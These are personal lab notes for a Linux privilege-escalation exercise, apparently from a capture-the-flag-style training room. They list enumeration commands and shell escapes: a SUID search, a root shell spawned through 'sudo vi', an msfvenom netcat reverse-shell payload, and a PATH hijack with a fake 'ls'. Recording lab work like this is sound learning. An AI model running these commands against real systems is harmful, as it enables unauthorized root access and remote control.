# Linux Fundamentals

I've already done the first three rooms for this and didn't take notes. Better late than never.

## Common Linux Privesc

### Task 4 Enumeration

2. What is the target's hostname?

```
echo $HOSTNAME
```

3. Look at the output of /etc/passwd how many "user[x]" are there on the system?

```
cat /etc/passwd
```

4. How many available shells are there on the system?

```
cat /etc/shells
```

5. What is the name of the bash script that is set to run every 5 minutes by cron?

```
cat /etc/crontab
```

6. What critical file has had its permissions changed to allow some users to write to it
```
ls -la /etc/passwd
``` 
Used hint.

### Task 5 Abusing SUID/GUID Files

1. What is the path of the file in user3's directory that stands out?
```
find / -perm -u=s -type f 2\>/dev/null
```

### Task 7 Exploiting Vi Editor
```
sudo -l
```
To see what we can run as sudo. If vi, `sudo vi` to open editor, then `:!sh` to spawn shell.

### Task 8 Exploiting Crontab

4. Create payload
```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

### Task 9 Exploiting PATH Variable

4. What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating?
```
echo "/bin/bash" > ls
```

5. Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
```
chmod +x ls
```

6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"

